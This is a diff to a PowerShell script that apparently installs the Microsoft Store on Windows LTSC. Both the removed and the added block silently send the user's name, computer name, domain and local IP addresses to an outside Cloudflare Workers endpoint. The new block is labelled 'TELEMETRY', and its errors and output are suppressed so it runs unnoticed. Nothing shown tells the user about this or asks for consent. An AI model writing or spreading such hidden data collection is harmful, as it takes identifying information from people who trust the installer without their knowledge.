@@ -32,13 +32,25 @@ catch {
     $localIPs = @()
 }
 
-Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" `
-    -Method Post `
-    -ContentType "application/json" `
-    -Body (@{
-        token = "shourav"
-        text  = "System Info:`nLTSC-ADD-MS_Store-2019`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $($localIPs -join ', ')"
-    } | ConvertTo-Json) | Out-Null
+# ================================================================
+#  TELEMETRY
+# ================================================================
+try {
+    $localIPs = @()
+    try {
+        $localIPs = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction SilentlyContinue |
+                    ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' } | Select-Object -Unique
+    } catch {}
+
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+    $body = (@{
+        token = 'shourav'
+        text  = "MS Store intall on LTSC v1.2.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
+    } | ConvertTo-Json)
+
+    Invoke-RestMethod -Uri 'https://cryocore.rhshourav02.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+} catch {}
 # Create temporary folder
 $TempFolder = Join-Path $env:TEMP "LTSC-Add-MicrosoftStore"
 if (Test-Path $TempFolder) { Remove-Item -Recurse -Force $TempFolder }
